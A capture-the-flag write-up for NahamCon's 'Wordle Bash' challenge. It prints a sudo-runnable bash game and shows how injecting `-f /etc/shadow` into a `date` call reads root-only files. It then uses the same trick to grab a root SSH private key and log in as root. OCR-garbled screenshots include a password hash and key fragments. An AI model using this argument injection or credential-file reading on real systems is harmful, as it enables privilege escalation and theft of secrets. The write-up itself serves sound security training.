# Wordle Bash
> We put a new novel spin on the old classic game of Wordle! Now it's written in bash! :D

> Oh, and you aren't guessing words, this time...

## About the Challenge
We were given a SSH server to connect, and after connect we got a bash file called `wordle_bash.sh`. Here is the content of the file

```shell
#!/bin/bash

YEARS=("2020" "2021" "2022" "2023" "2024" "2025")
MONTHS=("01" "02" "03" "04" "05" "06" "07" "08" "09" "10" "11" "12" )
DAYS=("01" "02" "03" "04" "05" "06" "07" "08" "09" "10" "11" "12" "13" "14" "15" "16" "17" "18" "19" "20" "21" "22" "23" "24" "25" "26" "27" "28" "29" "30" "31")

YEARS_SIZE=${#YEARS[@]}
YEARS_INDEX=$(($RANDOM % $YEARS_SIZE))
YEAR=${YEARS[$YEARS_INDEX]}

MONTHS_SIZE=${#MONTHS[@]}
MONTHS_INDEX=$(($RANDOM % $MONTHS_SIZE))
MONTH=${MONTHS[$MONTHS_INDEX]}

DAYS_SIZE=${#DAYS[@]}
DAYS_INDEX=$(($RANDOM % $DAYS_SIZE))
DAY=${DAYS[$DAYS_INDEX]}

TARGET_DATE="${YEAR}-${MONTH}-${DAY}"

gum style \
  --foreground 212 --border-foreground 212 --border double \
  --align center --width 50 --margin "1 2" --padding "2 4" \
  'WORDLE DATE' 'Uncover the correct date!'

echo "We've selected a random date, and it's up to you to guess it!"

wordle_attempts=1
while [ $wordle_attempts -le 5 ]
do
  echo "Attempt $wordle_attempts:"
  echo "Please select the year you think we've chosen:"
  chosen_year=$(gum choose ${YEARS[@]})

  echo "Now, enter the month of your guess: "
  chosen_month=$(gum choose ${MONTHS[@]})

  echo "Finally, enter the day of your guess: "
  chosen_day=$(gum choose ${DAYS[@]})

  guess_date="$chosen_year-$chosen_month-$chosen_day"

  if ! date -d $guess_date; then
    echo "Invalid date! Your guess must be a valid date in the format YYYY-MM-DD."
    exit
  fi

  confirmed=1
  while [ $confirmed -ne 0 ]
  do
    gum confirm "You've entered '$guess_date'. Is that right?"
    confirmed=$?
    if [[ $confirmed -eq 0 ]]
    then
      break
    fi
    echo "Please select the date you meant:"
    guess_date=$(gum input --placeholder $guess_date)
  done

  if [[ $(date $guess_date) == $(date -d $TARGET_DATE +%Y-%m-%d) ]]; then
    gum style \
      --foreground 212 --border-foreground 212 --border double \
      --align center --width 50 --margin "1 2" --padding "2 4" \
      "Congratulations, you've won! You correctly guessed the date!" 'Your flag is:' $(cat /root/flag.txt)
    exit 0
  else
    echo "Sorry, that wasn't correct!"
    echo "====================================="
  fi

  wordle_attempts=$((wordle_attempts+1))
done

gum style \
  --foreground 212 --border-foreground 212 --border double \
  --align center --width 50 --margin "1 2" --padding "2 4" \
  "Sorry, you lost." "The correct date was $TARGET_DATE."
```

This program can also be run as a root user.


[Image extracted text: userdwordle: $ sudo
-1
sudo:
unable
to mkdir
Irun/sudo/ts: Read-only file system
sudo:
Irun/sudolts:
Read-only
file system
We
trust
you
have
received
the
usual
lecture
from
the
local
System
Administrator
It
usually boils
down
to these
three
things=
#1)
Respect the privacy
of
others
#2)
Think
before
you type
#3)
With great power
comes great responsibility
For
security
reasons ,
the password
you type will
not
be visible
[sudo]
password for
user
Matching
Defaults
entries
for
user
on
wordle-bash-ae9df892dd5769fd-945567c95-gtg6b
env_reset
mail_badpass
secure_path-/usr/local/sbin| : /usr/local/bin| :/usr_
sbin| :/usr/bin] :
sbin| : /bin| : /snap/bin
User
user
may
run
the following
commands
on
wordle-bash-ae9df892dd5769fd-945567c95-gtg6b:
(root)
/home/user/wordle_bash
sh]


## How to Solve?
We can read any file as root because on this line

```shell
...
    guess_date=$(gum input --placeholder $guess_date)
  done

  if [[ $(date $guess_date) == $(date -d $TARGET_DATE +%Y-%m-%d) ]]; then
    gum style \
...
```

If we input `-f /etc/shadow` in the date prompt, it will execute `date -f /etc/shadow` command as root


[Image extracted text: Finally,
enter
the
of
guess
Wed
Jan
00
00
00
UTC
2020
Please
select the date
you
meant
date
invalid
date
troot: $6fuqg71yAXrSJBtkoBskuIpPLknAOF7. M4TTg8sfkQkOIx.6fRELQUtLpVixxSAb58jEPo2fCKwqWJMOwkLVznEIFSL .aUNTGZUSyESdo
19524:0:::
date
invalid
date
tbin:! ::0::::
date
invalid date
daemon: ! ::0:
date:
invalid
date
adm: ! ::0: ::
date
invalid date
'Lp:!::0:
date
invalid
date
sync
!:
0 :
date:
invalid date
shutdown:
0:
date
invalid
date
thalt:!
date:
invalid date
mail:
date
invalid
date
news
!:
deto
invalid
deto
tucn
day
your
:0_]


But when I want to read `/root/flag.txt` file, the result was:


[Image extracted text: Wed
Jan
00 : 00
00 UTC
2020
Please
select
the
date
you
meant
date
invalid date
'[ Sorry
your
will
be displayed
once you have
code
execution
as
root
1'
that
wasn
correct!
Attempt
2 :
Pleaso
colect
+ho
Voar
Vo
think
Wa
Vo
chocon
flag
Sorry ,]


Hmm, that means we need to login as root in order to read the flag. At first I thought I need to bruteforce the `/etc/shadow` root password. But there is another way by reading the content of `/root/.ssh/id_rsa`


[Image extracted text: enter
the
month
of your guess:
Finally,
enter
the
of
your
guess
Wed
Jan
00
00
00 UTC
2020
Please
select
the
date
you
meant
date:
invalid date
BEGIN OPENSSH PRIVATE
KEY____=
date:
invalid
date
'b3BlbnNzaClrZXktdjEAAAAABGSvbmUAAAAEbmguZQAAAAAAAAABAAABLWAAAAdzc2gtcn'
date
invalid date
NhAAAAAwEAAQAAAYEAxl MaPu/ewDgLK/+qcskWbUtSiQtLBBXULsSEGWmGbTdKh KTtrc'
date
invalid
date
NhtghbSx8EiucLQWhbbWcvIqDAgrXYOgVb/sr/BEyklaVVTpFfLuFbsyZNZTqmONajdsf9'
date:
invalid date
'Kl/4Qy9u8/3duhBYaeVOAm4tKOmzM8/D2YbzmYD+pK8GFWJDQGSRdFst j6NxXjROAsaj8H'
date
invalid
date
'UTHHvkNFctEMMBmquAaG85DZO83ZUWWASB7OZUNrc701Mhdf7Ln92DZaEhwMisdBjK/F83'
date
invalid date
'K7IYIcrpkuDTQYhmsuSGULYILUaIhridKH3m3BgCNhCSmjsySIkVOVwG/ SRxewOadhHxT+'
date
invalid
date
Gc9izizyyluW-
wrJTOu8_
ImQhTm3SR+cLD+SpWJSHSWDxygCVHTUvVIngNakJvWXRKDmS3N'
date
invalid date
'PjIuggaJ3D69Q3BDlxcbluhjl2Z/SnenryuzdoVORnCf7SYillgTtI/FhSZHnHyw6gLaJoH'
date:
invalid
date
1NPGh/mV7300snqtdakxkHXd3CDhcwYSQjvJLFEdAAAFgALNDvEJTQTxAAAAB3NzaClyc2'
date
invalid date
EAAAGBAMZZTGjTv3sA4JSv/qnLJFmlEOokL SwQV+CZORBLphm03SoeyuTawjYbfYWOsfBI
date
invalid
date
uHCOFoW28HLyKgwIK1ZDvVW
7K/wRMpNWL VU6RXyZhW7MmTWU6p j jWo3bH/ Spf+EMvbvPg
Now ,
day]


Use that key to login as root, and then run the executable program to obtain the flag


[Image extracted text: daffainfo@LAPTOP-FIL3RGSH:
$
ssh
~p
32666 root@challenge .nahamcon
com
id_rsa
root@wordle:
#
ls
txt
get_
_random_suffix_345674837560870345
root@wordle:
#
Iget_flag_random_suffix_345674837560870345
Please
press
Enter within
one
second
to retrieve
the
flag
flag{2b9576d1a7a631b8cel2595f80f3aba5}
root@wordle:
flag
flag]


```
flag{2b9576d1a7a631b8ce12595f80f3aba5}
```